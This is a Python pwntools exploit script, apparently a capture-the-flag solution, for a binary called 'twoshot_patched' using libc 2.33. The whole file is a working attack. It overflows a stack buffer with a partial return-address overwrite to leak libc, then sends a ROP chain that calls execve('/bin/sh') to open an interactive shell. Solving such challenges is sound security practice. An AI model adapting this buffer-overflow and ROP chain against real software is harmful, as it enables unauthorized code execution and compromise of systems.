#!/usr/bin/env python3

from pwn import *

exe = ELF("./twoshot_patched")
libc = ELF("./libc-2.33.so")
ld = ELF("./ld-2.33.so")

context.binary = exe


def conn(LOCAL):
    if LOCAL == 1:
        r = process([exe.path])
        #gdb.attach(r, '''b*main+134\nc''')
    else:
        r = remote("addr", 1337)

    return r


def main():
    while(1):
        r = conn(1)
    
        ######################
        pop_r14_r15 = 0x0000000000028a52
        libc_start_main = 0x28565 
        ######################

        payload = b'a'*0x48 + p16(0x9a52)
        r.sendline(payload)

        r.recvuntil(b'a'*0x48)
        libc.address = int.from_bytes(r.recv(6), 'little') - 0x0000000000028a52
        log.info('Libc_base:    ' + hex(libc.address))
        pop_rdx = 0x00000000000c7f32 + libc.address
        pop_rdi = 0x0000000000028a55 + libc.address
        pop_rsi = 0x000000000002a4cf + libc.address
	    
        payload = flat(
            b'a'*0x48,
            pop_rdi,
            next(libc.search(b'/bin/sh')),
            pop_rsi, 0,
		    pop_rdx, 0,
            libc.sym['execve']
        )
        r.sendline(payload)
        r.sendline(b'ls')  
        r.interactive()
        p = r.recvall()
        if b'twoshot_patched.i64' in p:
            break

if __name__ == "__main__":
    main()

